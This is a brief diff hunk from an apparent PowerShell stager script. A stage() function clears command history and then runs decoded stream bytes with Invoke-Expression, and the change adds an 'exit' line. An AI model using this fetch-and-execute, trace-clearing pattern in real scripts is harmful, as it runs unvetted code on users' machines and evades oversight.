@@ -53,6 +53,7 @@ function stage() {
     } while ($g -lt $e)
 	clhy
 	IEx ([Text.Encoding]::ASCII).GetString($s.ToArray())
+	exit
 }
 stage
 
